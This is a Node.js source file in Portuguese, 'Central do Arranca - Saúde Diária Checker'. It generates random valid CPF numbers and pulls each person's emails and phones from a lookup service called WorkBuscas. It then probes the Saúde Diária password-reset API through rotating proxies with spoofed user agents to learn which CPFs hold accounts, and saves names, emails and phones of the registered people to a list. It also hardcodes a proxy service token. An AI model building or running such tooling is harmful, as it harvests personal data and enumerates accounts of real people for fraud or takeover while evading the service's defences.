/**
 * Central do Arranca - Saúde Diária Checker
 * Checker específico para a API Saúde Diária
 * Gera CPF válido → Consulta WorkBuscas → Preenche payload → Testa API Saúde Diária
 */

const axios = require('axios');
const https = require('https');
const fs = require('fs-extra');
const path = require('path');
const WorkBuscasChecker = require('../workbuscas/checker');
let HttpsProxyAgent;
try {
  HttpsProxyAgent = require('https-proxy-agent');
} catch (_) {
  HttpsProxyAgent = null;
}

class SaudeChecker {
  constructor(options = {}) {
    this.proxyApiToken = 'qxew5x0zbdftbcsh63ql5flysll0jaf5u96msek9';
    this.proxyApiUrl = 'https://proxy.webshare.io/api/v2/proxy/list/';
    this.proxies = [];
    this.results = [];
    this.successCount = 0;
    this.errorCount = 0;
    this.registeredCount = 0;
    this.unregisteredCount = 0;
    this.batchSize = 20;
    this.delay = 2000;
    this.timeout = 10000;
    
    // API URL do Saúde Diária
    this.apiUrl = 'https://api-saudediaria.entregadigital.app.br/api/v1/app/resetpassword';
    
    // WorkBuscas Checker para buscar dados
    this.workbuscasChecker = new WorkBuscasChecker();
    
    // Cache de proxies - módulo Saúde
    this.cacheDir = path.join(__dirname, '../../.cache');
    this.cacheFile = path.join(this.cacheDir, 'proxies-saude.json');
    this.cacheExpiry = 24 * 60 * 60 * 1000; // 24 horas
  }
  
  /**
   * Gera um CPF válido aleatório
   */
  generateValidCPF() {
    function randomDigit() {
      return Math.floor(Math.random() * 10);
    }
    
    function calculateDigit(cpf, weights) {
      const sum = cpf.reduce((acc, digit, index) => acc + digit * weights[index], 0);
      const remainder = sum % 11;
      return remainder < 2 ? 0 : 11 - remainder;
    }
    
    // Gera os 9 primeiros dígitos
    const cpf = [];
    for (let i = 0; i < 9; i++) {
      cpf.push(randomDigit());
    }
    
    // Calcula o primeiro dígito verificador
    const weights1 = [10, 9, 8, 7, 6, 5, 4, 3, 2];
    cpf.push(calculateDigit(cpf, weights1));
    
    // Calcula o segundo dígito verificador
    const weights2 = [11, 10, 9, 8, 7, 6, 5, 4, 3, 2];
    cpf.push(calculateDigit(cpf, weights2));
    
    // Formata como string sem pontuação
    return cpf.join('');
  }
  
  /**
   * Formata telefone para +55XXXXXXXXXXX
   */
  formatPhone(phone) {
    if (!phone) return null;
    
    // Remove caracteres não numéricos
    let cleaned = phone.replace(/\D/g, '');
    
    // Se começa com 55, adiciona +
    if (cleaned.startsWith('55')) {
      return '+' + cleaned;
    }
    
    // Se começa com 0, remove o 0
    if (cleaned.startsWith('0')) {
      cleaned = cleaned.substring(1);
    }
    
    // Adiciona código do país se não tiver
    if (cleaned.length >= 10 && !cleaned.startsWith('55')) {
      return '+55' + cleaned;
    }
    
    return cleaned.length >= 10 ? '+55' + cleaned : null;
  }

  /**
   * Cria configurações SSL padrão para requisições
   */
  getSSLConfig() {
    return {
      httpsAgent: new https.Agent({
        rejectUnauthorized: false,
        secureProtocol: 'TLSv1_2_method'
      }),
      proxy: false,
      maxRedirects: 5,
      validateStatus: function (status) {
        return status >= 200 && status < 300;
      }
    };
  }

  /**
   * Gera um User-Agent aleatório de navegador real
   */
  getRandomUserAgent() {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  /**
   * Verifica se o cache de proxies é válido
   */
  isCacheValid() {
    try {
      if (!fs.existsSync(this.cacheFile)) {
        return false;
      }
      const stats = fs.statSync(this.cacheFile);
      const now = Date.now();
      const cacheAge = now - stats.mtime.getTime();
      return cacheAge < this.cacheExpiry;
    } catch (error) {
      return false;
    }
  }

  /**
   * Carrega proxies do cache
   */
  loadFromCache() {
    try {
      const cacheData = fs.readJsonSync(this.cacheFile);
      this.proxies = cacheData.proxies || [];
      console.log(`📦 ${this.proxies.length} proxies carregados do cache (Saúde)`);
      return this.proxies;
    } catch (error) {
      console.log('❌ Erro ao carregar cache:', error.message);
      return [];
    }
  }

  /**
   * Salva proxies no cache
   */
  async saveToCache(proxies) {
    try {
      await fs.ensureDir(this.cacheDir);
      const cacheData = {
        proxies: proxies,
        timestamp: Date.now(),
        count: proxies.length
      };
      await fs.writeJson(this.cacheFile, cacheData, { spaces: 2 });
      console.log(`💾 ${proxies.length} proxies salvos no cache (Saúde)`);
    } catch (error) {
      console.log('❌ Erro ao salvar cache:', error.message);
    }
  }

  /**
   * Carrega proxies da API Webshare
   */
  async loadProxies(progressCallback) {
    // Verifica cache primeiro
    if (this.isCacheValid()) {
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        this.proxies = cachedProxies;
        return this.proxies;
      }
    }
    
    console.log('🔄 [Saúde] Carregando proxies da Webshare...');
    
    try {
      const allProxies = [];
      let page = 1;
      const pageSize = 25;
      
      while (true) {
        const response = await axios.get(this.proxyApiUrl, {
          params: {
            mode: 'direct',
            page: page,
            page_size: pageSize
          },
          headers: {
            'Authorization': `Token ${this.proxyApiToken}`
          },
          timeout: 10000,
          ...this.getSSLConfig()
        });
        
        const proxies = response.data.results || [];
        if (proxies.length === 0) break;
        
        allProxies.push(...proxies);
        
        if (progressCallback) {
          progressCallback(allProxies.length);
        }
        
        page++;
        
        if (allProxies.length >= 1000) break;
        await new Promise(resolve => setTimeout(resolve, 200));
      }
      
      this.proxies = allProxies.slice(0, 1000);
      
      // Salva no cache
      await this.saveToCache(this.proxies);
      
      return this.proxies;
      
    } catch (error) {
      console.log('❌ [Saúde] Erro ao carregar proxies:', error.message);
      
      // Fallback para cache mesmo expirado
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        console.log('📦 [Saúde] Usando cache expirado como fallback');
        this.proxies = cachedProxies;
        return this.proxies;
      }
      
      throw error;
    }
  }

  /**
   * Obtém um proxy aleatório
   */
  getRandomProxy() {
    if (this.proxies.length === 0) {
      return null;
    }
    
    const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
    return {
      host: proxy.proxy_address,
      port: proxy.port,
      auth: proxy.username && proxy.password ? {
        username: proxy.username,
        password: proxy.password
      } : undefined
    };
  }

  /**
   * Consulta WorkBuscas para obter emails e telefones
   */
  async consultWorkBuscas(cpf) {
    try {
      const result = await this.workbuscasChecker.makeAPIRequest(cpf);
      
      if (result.success && result.interpretation === 'found' && result.data) {
        const data = result.data;
        
        // Extrai TODOS os emails disponíveis
        const emails = [];
        if (data.email) {
          emails.push(data.email);
        }
        if (data.emails && Array.isArray(data.emails) && data.emails.length > 0) {
          data.emails.forEach(e => {
            if (e.email && !emails.includes(e.email)) {
              emails.push(e.email);
            }
          });
        }
        
        // Extrai TODOS os telefones disponíveis e formata
        const phones = [];
        if (data.telefones && Array.isArray(data.telefones) && data.telefones.length > 0) {
          data.telefones.forEach(t => {
            if (t.telefone || t.numero) {
              const phone = this.formatPhone(t.telefone || t.numero);
              if (phone && !phones.includes(phone)) {
                phones.push(phone);
              }
            }
          });
        }
        if (data.telefone && !phones.includes(this.formatPhone(data.telefone))) {
          phones.push(this.formatPhone(data.telefone));
        }
        
        return {
          success: true,
          emails: emails,
          phones: phones,
          email: emails.length > 0 ? emails[0] : null, // Mantém primeiro para compatibilidade
          phone: phones.length > 0 ? phones[0] : null, // Mantém primeiro para compatibilidade
          workbuscasData: data
        };
      }
      
      return {
        success: false,
        emails: [],
        phones: [],
        email: null,
        phone: null,
        workbuscasData: null
      };
    } catch (error) {
      console.error('[Saúde] Erro ao consultar WorkBuscas:', error.message);
      return {
        success: false,
        emails: [],
        phones: [],
        email: null,
        phone: null,
        workbuscasData: null
      };
    }
  }
  
  /**
   * Faz requisição à API Saúde Diária
   */
  async makeAPIRequest(cpf, email, phonenumber, proxy = null) {
    try {
      const payload = {
        email: email || 'email@exemplo.com',
        cpf: cpf,
        phonenumber: phonenumber || '+5511999999999',
        type: 'PWA'
      };
      
      const url = this.apiUrl;
      
      const axiosConfig = {
        method: 'post',
        url: url,
        data: payload,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent(),
          'Accept': 'application/json'
        },
        timeout: this.timeout,
        ...this.getSSLConfig(),
        validateStatus: function (status) {
          return status >= 200 && status < 500;
        }
      };
      
      // Configura proxy se fornecido
      if (proxy) {
        if (HttpsProxyAgent) {
          const authPart = proxy.auth && proxy.auth.username && proxy.auth.password
            ? `${encodeURIComponent(proxy.auth.username)}:${encodeURIComponent(proxy.auth.password)}@`
            : '';
          const proxyUrl = `http://${authPart}${proxy.host}:${proxy.port}`;
          axiosConfig.proxy = false; // usar agent em vez do objeto proxy
          axiosConfig.httpsAgent = new HttpsProxyAgent.HttpsProxyAgent(proxyUrl);
        } else {
          axiosConfig.proxy = {
            host: proxy.host,
            port: proxy.port,
            auth: proxy.auth,
            protocol: 'http'
          };
        }
      }
      
      const response = await axios(axiosConfig);
      const status = response.status;
      const responseData = response.data || {};
      
      // Log apenas se encontrar cadastrado ou erro
      if (status === 201) {
        console.log(`[Saúde] ✅ CPF ${cpf} CADASTRADO - Status: ${status}`);
      }
      
      // Interpreta a resposta baseado no conteúdo
      // Baseado no teste real:
      // - Status 201 + msg "Foi enviado um email..." = CPF CADASTRADO
      // - Status 202 + msg "não conferem" = CPF NÃO CADASTRADO ou dados errados
      let interpretation = 'unknown';
      
      // Verifica primeiro pelo status
      if (status === 201) {
        // Status 201 (Created) = CPF cadastrado e reset de senha foi enviado
        interpretation = 'registered';
      } else if (status === 202) {
        // Status 202 = geralmente indica que dados não conferem ou CPF não cadastrado
        if (responseData.msg) {
          const msg = responseData.msg.toLowerCase();
          
          // Se a mensagem indica que enviou email = cadastrado
          if (msg.includes('enviado') && (msg.includes('email') || msg.includes('senha'))) {
            interpretation = 'registered';
          } else if (msg.includes('não conferem') || msg.includes('nao conferem')) {
            // Dados não conferem = não cadastrado ou dados errados
            interpretation = 'not_registered';
          } else {
            interpretation = 'not_registered';
          }
        } else {
          interpretation = 'not_registered';
        }
      } else if (responseData.appuser && responseData.appuser !== null) {
        // appuser preenchido = CPF cadastrado
        interpretation = 'registered';
      } else if (status === 400 || status === 404 || status === 422) {
        interpretation = 'not_registered';
      } else if (responseData.msg) {
        // Verifica a mensagem
        const msg = responseData.msg.toLowerCase();
        
        if (msg.includes('enviado') && (msg.includes('email') || msg.includes('senha'))) {
          interpretation = 'registered';
        } else if (msg.includes('não conferem') || msg.includes('nao conferem')) {
          interpretation = 'not_registered';
        } else if (msg.includes('encontrado') || msg.includes('não existe') || msg.includes('não cadastrado')) {
          interpretation = 'not_registered';
        } else {
          interpretation = 'not_registered';
        }
      } else {
        interpretation = 'error';
      }
      
      return {
        cpf: cpf,
        success: status >= 200 && status < 400,
        status: status,
        interpretation: interpretation,
        response: responseData,
        payload: payload,
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy',
        timestamp: new Date().toISOString()
      };
      
    } catch (error) {
      this.errorCount++;
      return {
        cpf: cpf,
        success: false,
        status: error.response?.status || 0,
        error: error.message,
        interpretation: 'error',
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy',
        timestamp: new Date().toISOString()
      };
    }
  }
  
  /**
   * Verifica um único CPF na API Saúde Diária
   * Lógica: Gera CPF → Consulta WorkBuscas → Preenche payload → Testa API
   */
  async checkCPF(cpf = null, showProxyInfo = false) {
    try {
      // Se CPF não foi fornecido, gera um válido
      if (!cpf) {
        cpf = this.generateValidCPF();
      }
      
      // Remove formatação do CPF
      cpf = cpf.replace(/\D/g, '');
      
      if (cpf.length !== 11) {
        return {
          cpf: cpf,
          success: false,
          error: 'CPF inválido',
          status: 0,
          interpretation: 'invalid',
          timestamp: new Date().toISOString()
        };
      }
      
      // Consulta WorkBuscas para obter emails e telefones
      const workbuscasResult = await this.consultWorkBuscas(cpf);
      
      const emails = workbuscasResult.emails || [];
      const phones = workbuscasResult.phones || [];
      
      // Se não encontrou email E telefone no WorkBuscas, não testa na API do Saúde Diária
      if (emails.length === 0 && phones.length === 0) {
        return {
          cpf: cpf,
          success: false,
          error: 'Dados insuficientes (emails e telefones não encontrados no WorkBuscas)',
          status: 0,
          interpretation: 'skipped',
          proxy: 'N/A',
          workbuscas: null,
          workbuscasSuccess: false,
          timestamp: new Date().toISOString()
        };
      }
      
      // Se não tem emails, usa um padrão
      if (emails.length === 0) {
        emails.push('email@exemplo.com');
      }
      
      // Se não tem telefones, usa um padrão
      if (phones.length === 0) {
        phones.push('+5511999999999');
      }
      
      // FORÇA uso de proxy - não permite requisição sem proxy se houver proxies disponíveis
      if (this.proxies.length === 0) {
        return {
          cpf: cpf,
          success: false,
          error: 'Nenhum proxy disponível',
          status: 0,
          interpretation: 'error',
          proxy: 'N/A',
          workbuscas: workbuscasResult.workbuscasData,
          workbuscasSuccess: workbuscasResult.success,
          timestamp: new Date().toISOString()
        };
      }
      
      // Testa com TODOS os emails encontrados
      let finalResult = null;
      let usedProxy = 'N/A';
      
      for (const email of emails) {
        // Usa primeiro telefone para este email (ou todos se quiser testar todas combinações)
        const phonenumber = phones[0];
        
        // Obtém proxy aleatório para cada tentativa
        let proxy = this.getRandomProxy();
        let firstProxy = proxy;
        usedProxy = proxy ? `${proxy.host}:${proxy.port}` : 'N/A';
        
        // Faz requisição à API Saúde Diária com retry e rotação de proxy (SEM FALLBACK SEM PROXY)
        let result = null;
        let retryCount = 0;
        const maxRetries = 3; // Mais tentativas já que não vamos usar fallback sem proxy
        
        while (retryCount <= maxRetries && this.proxies.length > 0) {
          try {
            result = await this.makeAPIRequest(cpf, email, phonenumber, proxy);
            
            // Se sucesso ou encontrou cadastrado, para de testar outros emails
            if (result.success || result.interpretation === 'registered') {
              if (proxy && result.proxy === 'Sem Proxy') {
                result.proxy = `${proxy.host}:${proxy.port}`;
              }
              usedProxy = result.proxy;
              finalResult = result;
              if (result.interpretation === 'registered') {
                console.log(`[Saúde] ✅ CPF ${cpf} CADASTRADO com email ${email}`);
              }
              break; // Para de testar outros emails
            }
            
            // Se erro de rede/timeout, tenta com outro proxy (NÃO tenta sem proxy)
            if (result.error && (result.error.includes('timeout') || result.error.includes('ECONNREFUSED') || result.error.includes('network'))) {
              retryCount++;
              if (retryCount <= maxRetries && this.proxies.length > 0) {
                // Tenta com outro proxy
                proxy = this.getRandomProxy();
                await this.sleep(500);
                continue;
              }
            }
            
            // Se não foi erro de rede, também para (pode ser que não esteja cadastrado com este email)
            break;
          } catch (error) {
            retryCount++;
            if (retryCount <= maxRetries && this.proxies.length > 0) {
              // Tenta com outro proxy
              proxy = this.getRandomProxy();
              await this.sleep(500);
              continue;
            }
            // Se esgotou tentativas, continua para próximo email
            break;
          }
        }
        
        // Se encontrou cadastrado, para de testar outros emails
        if (finalResult && finalResult.interpretation === 'registered') {
          break;
        }
        
        // Se não teve sucesso, continua para próximo email
        if (!finalResult || finalResult.interpretation !== 'registered') {
          finalResult = result; // Guarda último resultado (pode ser not_registered ou error)
          continue; // Testa próximo email
        }
      }
      
      // Se testou todos os emails mas não encontrou cadastrado, usa último resultado
      if (!finalResult) {
        finalResult = {
          cpf: cpf,
          success: false,
          error: 'Todos os emails foram testados sem sucesso',
          status: 0,
          interpretation: 'not_registered',
          proxy: usedProxy,
          timestamp: new Date().toISOString()
        };
      }
      
      // Atualiza proxy no resultado
      if (finalResult.proxy === 'Sem Proxy' || finalResult.proxy === 'N/A') {
        finalResult.proxy = usedProxy;
      }
      
      const result = finalResult;
      
      // Atualiza contadores
      if (result.success) {
        this.successCount++;
      } else {
        this.errorCount++;
      }
      
      if (result.interpretation === 'registered') {
        this.registeredCount++;
      } else if (result.interpretation === 'not_registered') {
        this.unregisteredCount++;
      }
      
      // Adiciona dados do WorkBuscas ao resultado
      result.workbuscas = workbuscasResult.workbuscasData;
      result.workbuscasSuccess = workbuscasResult.success;
      
      // Garante que sempre tem proxy no resultado (não pode ser "Sem Proxy" ou "N/A")
      if (!result.proxy || result.proxy === 'Sem Proxy' || result.proxy === 'N/A') {
        if (this.proxies.length > 0) {
          // Se tinha proxy disponível mas não foi usado, isso é um erro
          const randomProxy = this.getRandomProxy();
          result.proxy = randomProxy ? `${randomProxy.host}:${randomProxy.port}` : 'N/A';
        } else {
          result.proxy = 'N/A';
        }
      }
      
      return result;
      
    } catch (error) {
      this.errorCount++;
      return {
        cpf: cpf || 'N/A',
        success: false,
        error: error.message,
        status: 0,
        interpretation: 'error',
        timestamp: new Date().toISOString()
      };
    }
  }

  /**
   * Verifica múltiplos CPFs
   * Se não fornecer CPFs, gera automaticamente
   */
  async checkMultipleCPFs(cpfs = []) {
    const results = [];
    
    // Se não forneceu CPFs, gera automaticamente
    if (!cpfs || cpfs.length === 0) {
      cpfs = [];
      for (let i = 0; i < this.batchSize; i++) {
        cpfs.push(this.generateValidCPF());
      }
    }
    
    for (const cpf of cpfs) {
      const result = await this.checkCPF(cpf);
      results.push(result);
      this.results.push(result);
      
      // Delay entre requisições
      await this.sleep(this.delay);
    }
    
    return results;
  }

  /**
   * Salva resultados em arquivo
   */
  async saveResults(filename = null) {
    if (!filename) {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0];
      filename = `saude-valid-cpfs-${timestamp}.txt`;
    }
    
    const listaDir = path.resolve(process.cwd(), 'lista', 'saude');
    if (!fs.existsSync(listaDir)) {
      fs.mkdirSync(listaDir, { recursive: true });
    }
    
    const filePath = path.join(listaDir, filename);
    
    let content = '='.repeat(60) + '\n';
    content += 'CENTRAL DO ARRANCA - SAÚDE DIÁRIA CHECKER\n';
    content += '='.repeat(60) + '\n\n';
    content += `Data/Hora: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n`;
    content += `Total de resultados: ${this.results.length}\n`;
    content += `CPFs Cadastrados: ${this.registeredCount}\n`;
    content += `CPFs Não Cadastrados: ${this.unregisteredCount}\n`;
    content += `Erros: ${this.errorCount}\n\n`;
    content += '='.repeat(60) + '\n\n';
    
    // Filtra apenas CPFs cadastrados
    const validCPFs = this.results.filter(r => r.interpretation === 'registered');
    
    if (validCPFs.length > 0) {
      content += 'CPFS CADASTRADOS:\n';
      content += '='.repeat(60) + '\n\n';
      
      validCPFs.forEach((result, index) => {
        content += `${index + 1}. CPF: ${result.cpf}\n`;
        if (result.payload) {
          content += `   Email: ${result.payload.email}\n`;
          content += `   Telefone: ${result.payload.phonenumber}\n`;
        }
        if (result.workbuscas) {
          content += `   Nome: ${result.workbuscas.nome || 'N/A'}\n`;
        }
        content += `   Status: ${result.status}\n`;
        content += `   Data/Hora: ${new Date(result.timestamp).toLocaleString('pt-BR')}\n`;
        content += '\n';
      });
    }
    
    await fs.writeFile(filePath, content, 'utf8');
    
    return filePath;
  }

  /**
   * Função de sleep
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = SaudeChecker;

